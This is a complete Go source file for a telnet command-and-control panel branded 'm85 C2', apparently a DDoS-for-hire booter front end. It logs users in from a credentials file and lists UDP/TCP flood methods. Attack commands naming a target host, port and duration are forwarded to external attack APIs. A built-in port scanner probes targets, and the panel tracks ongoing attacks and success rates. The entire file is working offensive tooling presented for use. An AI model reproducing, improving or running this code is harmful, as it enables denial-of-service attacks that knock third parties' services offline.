package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	IAC = 0xFF
	DO  = 0xFD
	DONT = 0xFE
	WILL  = 0xFB
	WONT = 0xFC
)

var (
	CLEAR_SCREEN = []byte("\033[2J\033[H")
	SET_TITLE    = []byte("\033]0;m85 C2 || Made By m85 || https://discord.gg/hNmBhr49h9\007")
	HOME_CURSOR  = []byte("\033[H")
	CLEAR_LINE   = []byte("\033[2K")
)

type Config struct {
	BannerFile  string `json:"banner_file"`
	WelcomeTfx  string `json:"welcome_tfx"`
	AttackTfx   string `json:"attack_tfx"`
	LoginFile   string `json:"login_file"`
	LogFile     string `json:"log_file"`
	Port        int    `json:"port"`
	APIs        []API  `json:"apis"`
}

type API struct {
	Name        string   `json:"name"`
	URL         string   `json:"url"`
	Key         string   `json:"key"`
	Methods     []string `json:"methods"`
	MethodParam string   `json:"method_param"`
}

type User struct {
	Username string
	Password string
	Delay    int
}

type Attack struct {
	Method string
	Host   string
	Port   int
	Dur    int
	Start  time.Time
	Success bool
}

type Session struct {
	Delay    int
	LastTime time.Time
	Attacks  []Attack
}

type Server struct {
	config  Config
	users   []User
	methods map[string]API
	logMu   sync.Mutex
	logFile *os.File
}

const BOX_WIDTH int = 70
const TERM_WIDTH int = 80
const CENTER_ROW int = 12

var (
	BOX_TOP    = "\033[31m" + "╔" + strings.Repeat("═", BOX_WIDTH) + "╗\r\n"
	BOX_BOTTOM = "\033[31m" + "╚" + strings.Repeat("═", BOX_WIDTH) + "╝\r\n"
	BOX_LINE   = "\033[31m" + "║" + strings.Repeat(" ", BOX_WIDTH) + "║\r\n"
	BOX_DIVIDER = "\033[31m" + "╠" + strings.Repeat("═", BOX_WIDTH) + "╣\r\n"
)

func centerText(text string, width int, borderCol, textCol string) string {
	if textCol == "" {
		textCol = "\033[37m"
	}
	if borderCol == "" {
		borderCol = "\033[31m"
	}
	lenText := len(text)
	if lenText > width {
		text = text[:width]
		lenText = width
	}
	spacesLeft := (width - lenText) / 2
	spacesRight := width - lenText - spacesLeft
	padded := strings.Repeat(" ", spacesLeft) + text + strings.Repeat(" ", spacesRight)
	return borderCol + "║" + textCol + padded + borderCol + "║\r\n\033[0m"
}

func leftText(text string, width int, borderCol, textCol string) string {
	if textCol == "" {
		textCol = "\033[37m"
	}
	if borderCol == "" {
		borderCol = "\033[31m"
	}
	padded := text
	if len(padded) > width {
		padded = padded[:width]
	} else {
		padded += strings.Repeat(" ", width - len(padded))
	}
	return borderCol + "║" + textCol + padded + borderCol + "║\r\n\033[0m"
}

var (
	SUCCESS_BORDER = func() string {
		green := "\033[32m"
		top := strings.ReplaceAll(BOX_TOP, "\033[31m", green)
		line := strings.ReplaceAll(BOX_LINE, "\033[31m", green)
		bottom := strings.ReplaceAll(BOX_BOTTOM, "\033[31m", green)
		return green + top + centerText("LOGIN SUCCESSFUL!", BOX_WIDTH, green, green) + line + centerText("Welcome to the m85 C2 Control Panel!", BOX_WIDTH, green, green) + line + bottom + "\033[0m"
	}()
	ERROR_BORDER = func() string {
		red := "\033[31m"
		white := "\033[37m"
		return red + BOX_TOP + centerText("LOGIN FAILED!", BOX_WIDTH, red, red) + BOX_LINE + centerText("Invalid username or password. Goodbye.", BOX_WIDTH, red, white) + BOX_BOTTOM + "\033[0m"
	}()
	HELP_BORDER = func() string {
		boldRed := "\033[31;1m"
		red := "\033[31m"
		white := "\033[37m"
		s := boldRed + BOX_TOP + centerText("HELP", BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
		s += leftText("? - Show this help", BOX_WIDTH, red, white)
		s += leftText("clear - Clear the terminal", BOX_WIDTH, red, white)
		s += leftText("methods - List all attack methods", BOX_WIDTH, red, white)
		s += leftText("lookup <host> - Lookup target information", BOX_WIDTH, red, white)
		s += leftText("ongoing - Show ongoing attacks", BOX_WIDTH, red, white)
		s += leftText("stats - Show user statistics", BOX_WIDTH, red, white)
		s += leftText("attack - Show attack command details", BOX_WIDTH, red, white)
		s += leftText("gif - Show and play TFX animations", BOX_WIDTH, red, white)
		s += leftText("quit - Exit session", BOX_WIDTH, red, white)
		s += "\033[31m" + BOX_BOTTOM + "\033[0m"
		return s
	}()
)

func getAttackSuccessBorder(method, host, dur string) string {
	red := "\033[31m"
	boldRed := "\033[31;1m"
	white := "\033[37m"
	boldWhite := "\033[37;1m"
	top := BOX_TOP
	s := boldRed + top + centerText("ATTACK LAUNCHED SUCCESSFULLY", BOX_WIDTH, red, boldWhite) + BOX_DIVIDER + "\033[0m"
	s += leftText(fmt.Sprintf("Method: %s", method), BOX_WIDTH, red, white)
	s += leftText(fmt.Sprintf("Host: %s", host), BOX_WIDTH, red, white)
	s += leftText(fmt.Sprintf("Duration: %ss", dur), BOX_WIDTH, red, white)
	s += leftText("Target locked and loaded! 💀", BOX_WIDTH, red, white)
	s += red + BOX_BOTTOM + "\033[0m"
	return s
}

func scanPorts(host string, ports []int) []int {
	var open []int
	var mu sync.Mutex
	var wg sync.WaitGroup
	for _, p := range ports {
		wg.Add(1)
		go func(port int) {
			defer wg.Done()
			timeout := time.Second
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
			if err == nil {
				mu.Lock()
				open = append(open, port)
				mu.Unlock()
			}
			if conn != nil {
				conn.Close()
			}
		}(p)
	}
	wg.Wait()
	sort.Ints(open)
	return open
}

func getOngoingBorder(session *Session) string {
	boldRed := "\033[31;1m"
	red := "\033[31m"
	white := "\033[37m"
	now := time.Now()
	var ongoing []Attack
	for _, a := range session.Attacks {
		if now.Sub(a.Start) < time.Duration(a.Dur)*time.Second {
			ongoing = append(ongoing, a)
		}
	}
	s := boldRed + BOX_TOP + centerText("ONGOING ATTACKS", BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
	if len(ongoing) == 0 {
		s += leftText("None active.", BOX_WIDTH, red, white)
	} else {
		for _, a := range ongoing {
			desc := fmt.Sprintf("%s %s:%d for %ds", a.Method, a.Host, a.Port, a.Dur)
			s += leftText(desc, BOX_WIDTH, red, white)
		}
	}
	s += "\033[31m" + BOX_BOTTOM + "\033[0m"
	return s
}

func getStatsBorder(session *Session) string {
	boldRed := "\033[31;1m"
	red := "\033[31m"
	white := "\033[37m"
	sent := len(session.Attacks)
	succ := 0
	totalDur := 0
	for _, a := range session.Attacks {
		if a.Success {
			succ++
		}
		totalDur += a.Dur
	}
	successRate := 0
	if sent > 0 {
		successRate = (succ * 100) / sent
	}
	s := boldRed + BOX_TOP + centerText("USER STATISTICS", BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
	statsLine := fmt.Sprintf("Attacks sent: %d | Success rate: %d%% | Total duration: %ds", sent, successRate, totalDur)
	s += leftText(statsLine, BOX_WIDTH, red, white)
	s += "\033[31m" + BOX_BOTTOM + "\033[0m"
	return s
}

func getMethodsBorder(s *Server) string {
	boldRed := "\033[31;1m"
	red := "\033[31m"
	white := "\033[37m"
	sOut := boldRed + BOX_TOP + centerText("AVAILABLE METHODS", BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
	var allMethods []string
	seen := make(map[string]bool)
	for _, api := range s.config.APIs {
		for _, m := range api.Methods {
			if !seen[m] {
				seen[m] = true
				allMethods = append(allMethods, m)
			}
		}
	}
	for _, m := range allMethods {
		var desc string
		if strings.Contains(strings.ToLower(m), "udp") || strings.Contains(strings.ToLower(m), "tcp") {
			desc = strings.ToUpper(m) + " Flood"
		} else {
			desc = strings.Title(m) + " Attack"
		}
		sOut += leftText("!"+m+" - "+desc, BOX_WIDTH, red, white)
	}
	sOut += "\033[31m" + BOX_BOTTOM + "\033[0m"
	return sOut
}

func getAttackBorder(s *Server) string {
	boldRed := "\033[31;1m"
	red := "\033[31m"
	white := "\033[37m"
	sOut := boldRed + BOX_TOP + centerText("ATTACK COMMANDS", BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
	var allMethods []string
	seen := make(map[string]bool)
	for _, api := range s.config.APIs {
		for _, m := range api.Methods {
			if !seen[m] {
				seen[m] = true
				allMethods = append(allMethods, m)
			}
		}
	}
	for _, m := range allMethods {
		var desc string
		if strings.Contains(strings.ToLower(m), "udp") || strings.Contains(strings.ToLower(m), "tcp") {
			desc = strings.ToUpper(m) + " Flood"
		} else {
			desc = strings.Title(m) + " Attack"
		}
		sOut += leftText("!"+m+" <host> <port> <time> - "+desc, BOX_WIDTH, red, white)
	}
	sOut += "\033[31m" + BOX_BOTTOM + "\033[0m"
	return sOut
}

func getLookupBorder(host string) string {
	boldRed := "\033[31;1m"
	red := "\033[31m"
	white := "\033[37m"
	ips, err := net.LookupIP(host)
	if err != nil {
		return getErrorBorder("LOOKUP ERROR", err.Error())
	}
	var ipsStr []string
	for _, ip := range ips {
		ipsStr = append(ipsStr, ip.String())
	}
	ipLine := "IPs: " + strings.Join(ipsStr, ", ")
	portsToScan := []int{21, 22, 23, 25, 53, 80, 110, 111, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443}
	var target string
	if len(ips) > 0 {
		target = ips[0].String()
	} else {
		target = host
	}
	openPorts := scanPorts(target, portsToScan)
	var openStr string
	if len(openPorts) == 0 {
		openStr = "None"
	} else {
		openStr = strings.Trim(fmt.Sprint(openPorts), "[]")
	}
	s := boldRed + BOX_TOP + centerText(fmt.Sprintf("LOOKUP FOR %s", strings.ToUpper(host)), BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
	s += leftText(ipLine, BOX_WIDTH, red, white)
	s += leftText(fmt.Sprintf("Open ports: %s", openStr), BOX_WIDTH, red, white)
	s += "\033[31m" + BOX_BOTTOM + "\033[0m"
	return s
}

func getErrorBorder(title, message string) string {
	red := "\033[31m"
	white := "\033[37m"
	boldRed := "\033[31;1m"
	top := BOX_TOP
	s := boldRed + top + centerText(title, BOX_WIDTH, red, boldRed) + BOX_DIVIDER + "\033[0m"
	lines := strings.Split(message, "\n")
	for _, line := range lines {
		s += leftText(line, BOX_WIDTH, red, white)
	}
	s += red + BOX_BOTTOM + "\033[0m"
	return s
}

func getSuccessBorder(title, message string) string {
	green := "\033[32m"
	boldGreen := "\033[32;1m"
	top := strings.ReplaceAll(BOX_TOP, "\033[31m", green)
	s := boldGreen + top + centerText(title, BOX_WIDTH, green, boldGreen) + BOX_DIVIDER + "\033[0m"
	lines := strings.Split(message, "\n")
	for _, line := range lines {
		s += leftText(line, BOX_WIDTH, green, green)
	}
	s += green + BOX_BOTTOM + "\033[0m"
	return s
}

func loadConfig(filename string) (Config, error) {
	file, err := os.Open(filename)
	if err != nil {
		return Config{}, err
	}
	defer file.Close()
	decoder := json.NewDecoder(file)
	var config Config
	err = decoder.Decode(&config)
	if err != nil {
		return Config{}, err
	}
	if config.Port == 0 {
		config.Port = 1111
	}
	if config.LoginFile == "" {
		config.LoginFile = "login.txt"
	}
	if config.LogFile == "" {
		config.LogFile = "logs.txt"
	}
	if config.BannerFile == "" {
		config.BannerFile = "banner.txt"
	}
	if config.WelcomeTfx == "" {
		config.WelcomeTfx = "welcome.tfx"
	}
	if config.AttackTfx == "" {
		config.AttackTfx = "attack.tfx"
	}
	return config, nil
}

func (s *Server) loadUsers() error {
	file, err := os.Open(s.config.LoginFile)
	if err != nil {
		return err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	var users []User
	for lineNum := 1; scanner.Scan(); lineNum++ {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) != 3 {
			return fmt.Errorf("invalid format in login.txt line %d: use 'username:password:delay'", lineNum)
		}
		username := parts[0]
		password := parts[1]
		delayStr := parts[2]
		delay, err := strconv.Atoi(delayStr)
		if err != nil || delay < 0 {
			return fmt.Errorf("invalid delay in login.txt line %d", lineNum)
		}
		users = append(users, User{username, password, delay})
	}
	s.users = users
	return scanner.Err()
}

func (s *Server) buildMethodsMap() {
	methods := make(map[string]API)
	for _, api := range s.config.APIs {
		for _, m := range api.Methods {
			methods["!"+m] = api
		}
	}
	s.methods = methods
}

func (s *Server) initLog() error {
	file, err := os.OpenFile(s.config.LogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		return err
	}
	s.logFile = file
	return nil
}

func (s *Server) logCommand(addr string, cmd string) {
	s.logMu.Lock()
	defer s.logMu.Unlock()
	timestamp := time.Now().Format(time.RFC3339)
	entry := fmt.Sprintf("%s %s: %s\n", timestamp, addr, cmd)
	_, _ = s.logFile.WriteString(entry)
	if strings.HasPrefix(cmd, "!") || strings.Contains(cmd, "LOGIN") {
		fmt.Printf("[%s] %s\n", addr, cmd)
	}
}

func (s *Server) closeLog() {
	if s.logFile != nil {
		s.logFile.Close()
	}
}

func readUntil(conn net.Conn, terminator byte) ([]byte, error) {
	buffer := bytes.NewBuffer(nil)
	for {
		b := make([]byte, 1)
		_, err := conn.Read(b)
		if err != nil {
			if err == io.EOF {
				return buffer.Bytes(), nil
			}
			return nil, err
		}
		if b[0] == IAC {
			cmd := make([]byte, 1)
			_, err = conn.Read(cmd)
			if err != nil {
				return nil, err
			}
			if cmd[0] == IAC {
				buffer.WriteByte(IAC)
				continue
			}
			opt := make([]byte, 1)
			_, err = conn.Read(opt)
			if err != nil {
				return nil, err
			}
			switch cmd[0] {
			case DO:
				conn.Write([]byte{IAC, WONT, opt[0]})
			case WILL:
				conn.Write([]byte{IAC, DONT, opt[0]})
			}
			continue
		}
		buffer.WriteByte(b[0])
		if b[0] == terminator {
			return buffer.Bytes(), nil
		}
	}
}

func (s *Server) sendAttackResponse(conn net.Conn, session *Session, method, host string, port, timeSec, delay int, apiSuccess bool, apiResponse string) {
	attack := Attack{
		Method: method[1:],
		Host:   host,
		Port:   port,
		Dur:    timeSec,
		Start:  time.Now(),
		Success: apiSuccess,
	}
	session.Attacks = append(session.Attacks, attack)
	if apiSuccess {
		attackPath := filepath.Join("branding", s.config.AttackTfx)
		if _, err := os.Stat(attackPath); err == nil {
			_ = s.sendAnimatedAscii(conn, attackPath, 1*time.Second)
		}
		conn.Write(CLEAR_SCREEN)
		_ = s.sendBanner(conn)
		conn.Write([]byte("\r\n\r\n"))
		conn.Write([]byte(getAttackSuccessBorder(method[1:], host, strconv.Itoa(timeSec))))
	} else {
		info := fmt.Sprintf("Method: %s\nHost: %s\nPort: %d\nDuration: %ds\nCooldown: %ds before next attack", method[1:], host, port, timeSec, delay)
		fullMsg := info + "\n\nFailed to launch attack. Please check your parameters and try again."
		conn.Write(CLEAR_SCREEN)
		errBorder := getErrorBorder("ATTACK FAILED", fullMsg)
		conn.Write([]byte(errBorder))
	}
}

func (s *Server) sendAnimatedAscii(conn net.Conn, path string, maxDuration time.Duration) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	lines := strings.Split(string(data), "\n")
	var frames [][]string
	currentFrame := []string{}
	emptyCount := 0
	const emptyThreshold = 3
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			emptyCount++
			if emptyCount >= emptyThreshold && len(currentFrame) > 0 {
				frames = append(frames, currentFrame)
				currentFrame = []string{}
				emptyCount = 0
			}
			continue
		}
		emptyCount = 0
		currentFrame = append(currentFrame, line)
	}
	if len(currentFrame) > 0 {
		frames = append(frames, currentFrame)
	}
	if len(frames) == 0 {
		return errors.New("no frames found")
	}
	numFrames := len(frames)
	frameDelay := maxDuration / time.Duration(numFrames)
	for i := 0; i < numFrames; i++ {
		frameStr := strings.Join(frames[i], "\r\n") + "\r\n"
		conn.Write(CLEAR_SCREEN)
		conn.Write([]byte(frameStr))
		if i < numFrames-1 {
			time.Sleep(frameDelay)
		}
	}
	conn.Write(CLEAR_SCREEN)
	return nil
}

func centerPrompt(prompt string) string {
	pad := strings.Repeat(" ", (TERM_WIDTH - len(prompt)) / 2)
	return fmt.Sprintf("\033[37m%s%s\033[0m\r\n", pad, prompt)
}

func (s *Server) sendBanner(conn net.Conn) error {
	bannerPath := filepath.Join("branding", s.config.BannerFile)
	file, err := os.Open(bannerPath)
	if err != nil {
		fallbackLines := []string{
			"\033[31m",
			" ___ ___ ___ ___ ",
			" (_)|_ __|__ |_ _ ",
			" | |/ _ \\ / _ / _ \\| '__| ",
			" | . __/ (_| | (_) | | ",
			" |_|\\___|\\__,_|\\___/|_| ",
			"\033[0m",
		}
		for _, line := range fallbackLines {
			conn.Write([]byte(line + "\r\n"))
		}
		return nil
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		conn.Write([]byte(line + "\r\n"))
	}
	if err := scanner.Err(); err != nil {
		return err
	}
	return nil
}

func (s *Server) handleClient(conn net.Conn, addr net.Addr) {
	defer func() {
		s.logMu.Lock()
		fmt.Printf("Connection closed from %s\n", addr.String())
		s.logMu.Unlock()
		conn.Close()
	}()
	session := Session{Delay: 0}
	conn.Write(CLEAR_SCREEN)
	conn.Write(SET_TITLE)
	for i := 0; i < CENTER_ROW-2; i++ {
		conn.Write([]byte("\r\n"))
	}
	conn.Write([]byte(centerPrompt("Username: ")))
	userBytes, err := readUntil(conn, '\n')
	if err != nil {
		return
	}
	username := strings.TrimSpace(string(userBytes))
	conn.Write([]byte(centerPrompt("Password: ")))
	passBytes, err := readUntil(conn, '\n')
	if err != nil {
		return
	}
	password := strings.TrimSpace(string(passBytes))
	cmd := fmt.Sprintf("LOGIN: %s:%s", username, password)
	s.logCommand(addr.String(), cmd)
	var matched *User
	for _, u := range s.users {
		if u.Username == username && u.Password == password {
			matched = &u
			break
		}
	}
	if matched == nil {
		conn.Write(CLEAR_SCREEN)
		conn.Write([]byte("\033[31mLogin failed. Invalid credentials.\033[0m\r\n"))
		time.Sleep(3 * time.Second)
		return
	}
	session.Delay = matched.Delay
	conn.Write([]byte(SUCCESS_BORDER))
	time.Sleep(2 * time.Second)
	conn.Write(CLEAR_SCREEN)
	welcomePath := filepath.Join("branding", s.config.WelcomeTfx)
	if _, err := os.Stat(welcomePath); err == nil {
		_ = s.sendAnimatedAscii(conn, welcomePath, 2*time.Second)
	}
	conn.Write(CLEAR_SCREEN)
	_ = s.sendBanner(conn)
	conn.Write([]byte("\r\n? for help.\r\n\r\n"))
	for {
		prompt := []byte("\033[31mm85 C2 > \033[0m")
		conn.Write(prompt)
		cmdBytes, err := readUntil(conn, '\n')
		if err != nil {
			break
		}
		cmd := strings.TrimSpace(string(cmdBytes))
		s.logCommand(addr.String(), cmd)
		now := time.Now()
		isAttack := strings.HasPrefix(cmd, "attack") || strings.HasPrefix(cmd, "!")
		if isAttack && !session.LastTime.IsZero() && now.Sub(session.LastTime) < time.Duration(session.Delay)*time.Second {
			remaining := time.Duration(session.Delay)*time.Second - now.Sub(session.LastTime)
			msg := fmt.Sprintf("\033[31mCooldown active. Wait %.1fs before next attack.\r\n\033[0m", remaining.Seconds())
			conn.Write([]byte(msg))
			conn.Write([]byte("\r\n"))
			continue
		}
		if cmd != "clear" {
			conn.Write(CLEAR_SCREEN)
			_ = s.sendBanner(conn)
			conn.Write([]byte("\r\n"))
		}
		switch {
		case cmd == "?":
			conn.Write([]byte(HELP_BORDER))
		case cmd == "clear":
			conn.Write(CLEAR_SCREEN)
			_ = s.sendBanner(conn)
			conn.Write([]byte("? for help.\r\n\r\n"))
		case cmd == "methods":
			methodsBorder := getMethodsBorder(s)
			conn.Write([]byte(methodsBorder))
		case strings.HasPrefix(cmd, "lookup"):
			parts := strings.Fields(cmd)
			if len(parts) != 2 {
				errBorder := getErrorBorder("ERROR", "Usage: lookup <host>")
				conn.Write([]byte(errBorder))
				continue
			}
			lookupBorder := getLookupBorder(parts[1])
			conn.Write([]byte(lookupBorder))
		case cmd == "ongoing":
			ongoingBorder := getOngoingBorder(&session)
			conn.Write([]byte(ongoingBorder))
		case cmd == "stats":
			statsBorder := getStatsBorder(&session)
			conn.Write([]byte(statsBorder))
		case cmd == "attack":
			attackBorder := getAttackBorder(s)
			conn.Write([]byte(attackBorder))
		case cmd == "gif":
			tfxFiles, _ := filepath.Glob("branding/*.tfx")
			var animations []string
			for _, f := range tfxFiles {
				base := filepath.Base(f)
				if !strings.Contains(strings.ToLower(base), "banner") && !strings.Contains(strings.ToLower(base), "login") && !strings.Contains(strings.ToLower(base), "log") && !strings.Contains(base, "config") && !strings.Contains(strings.ToLower(base), "attack") && !strings.Contains(strings.ToLower(base), "welcome") {
					animations = append(animations, f)
				}
			}
			if len(animations) == 0 {
				conn.Write([]byte("No TFX animations found.\r\n"))
				break
			}
			conn.Write([]byte(fmt.Sprintf("\033[32mAvailable TFX animations (%d):\r\n\033[0m", len(animations))))
			for i, f := range animations {
				conn.Write([]byte(fmt.Sprintf("%d. %s\r\n", i+1, filepath.Base(f))))
			}
			conn.Write([]byte("Enter number to play (0 to cancel): "))
			selBytes, _ := readUntil(conn, '\n')
			selStr := strings.TrimSpace(string(selBytes))
			selNum, _ := strconv.Atoi(selStr)
			if selNum < 1 || selNum > len(animations) {
				conn.Write([]byte("Invalid selection.\r\n"))
				break
			}
			selectedFile := animations[selNum-1]
			conn.Write([]byte(fmt.Sprintf("Playing %s...\r\n", filepath.Base(selectedFile))))
			_ = s.sendAnimatedAscii(conn, selectedFile, 2*time.Second)
		case cmd == "quit":
			conn.Write([]byte("\033[31mGoodbye! Session ended.\r\n\033[0m"))
			return
		case strings.HasPrefix(cmd, "!"):
			parts := strings.Fields(cmd)
			if len(parts) != 4 {
				errBorder := getErrorBorder("ERROR", "Usage: !<method> <host> <port> <time>")
				conn.Write([]byte(errBorder))
				continue
			}
			method := parts[0]
			host := parts[1]
			portStr := parts[2]
			timeStr := parts[3]
			if _, ok := s.methods[method]; !ok {
				errBorder := getErrorBorder("ERROR", "Invalid special method. Type ? for help.")
				conn.Write([]byte(errBorder))
				continue
			}
			api := s.methods[method]
			port, err := strconv.Atoi(portStr)
			if err != nil || port < 1 || port > 65535 {
				errBorder := getErrorBorder("ERROR", "Invalid port")
				conn.Write([]byte(errBorder))
				continue
			}
			dur, err := strconv.Atoi(timeStr)
			if err != nil || dur > 36000 {
				errBorder := getErrorBorder("ERROR", "Time too long (max 36000s)")
				conn.Write([]byte(errBorder))
				continue
			}
			if !strings.HasPrefix(strings.ToLower(host), "http") {
				host = "https://" + host
			}
			methodParam := method[1:]
			if api.Name == "new_api" {
				methodParam = strings.ToUpper(methodParam)
				methodParam = strings.ReplaceAll(methodParam, "-", "_")
			}
			url := fmt.Sprintf("%s?key=%s&host=%s&port=%d&time=%d&%s=%s", api.URL, api.Key, host, port, dur, api.MethodParam, methodParam)
			resp, err := http.Get(url)
			var success bool
			var bodyStr string
			if err != nil {
				success = false
				bodyStr = err.Error()
			} else if resp.StatusCode != 200 {
				success = false
				bodyStr = "Request failed with status: " + resp.Status
				resp.Body.Close()
			} else {
				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				bodyStr = string(bodyBytes)
				if api.Name == "old_api" {
					var data map[string]interface{}
					if json.Unmarshal(bodyBytes, &data) == nil {
						if status, ok := data["status"].(string); ok && status == "success" {
							success = true
						} else {
							success = false
							if msg, ok := data["message"].(string); ok {
								bodyStr = msg
							}
						}
					} else {
						success = false
						bodyStr = "Invalid JSON response"
					}
				} else {
					success = true
				}
			}
			s.sendAttackResponse(conn, &session, method, host, port, dur, session.Delay, success, bodyStr)
			if success {
				session.LastTime = now
			}
			conn.Write([]byte("\r\n"))
		default:
			unknownBorder := getErrorBorder("UNKNOWN COMMAND", "Type ? for help.")
			conn.Write([]byte(unknownBorder))
			conn.Write([]byte("\r\n"))
		}
	}
}

func main() {
	config, err := loadConfig("config.json")
	if err != nil {
		log.Fatal("Failed to load config:", err)
	}
	server := &Server{config: config}
	if err := server.loadUsers(); err != nil {
		log.Fatal("Failed to load users:", err)
	}
	server.buildMethodsMap()
	if err := server.initLog(); err != nil {
		log.Fatal("Failed to init log:", err)
	}
	defer server.closeLog()
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Port))
	if err != nil {
		log.Fatal("Failed to listen:", err)
	}
	defer listener.Close()
	fmt.Printf("Telnet server started on port %d. Connect with: telnet localhost %d\n", config.Port, config.Port)
	fmt.Println("Waiting for connections...")
	for {
		conn, err := listener.Accept()
		if err != nil {
			if opErr, ok := err.(*net.OpError); ok && opErr.Err.Error() == "use of closed network connection" {
				break
			}
			log.Println("Accept error:", err)
			continue
		}
		addr := conn.RemoteAddr()
		fmt.Printf("New connection from %s\n", addr)
		go server.handleClient(conn, addr)
	}
}
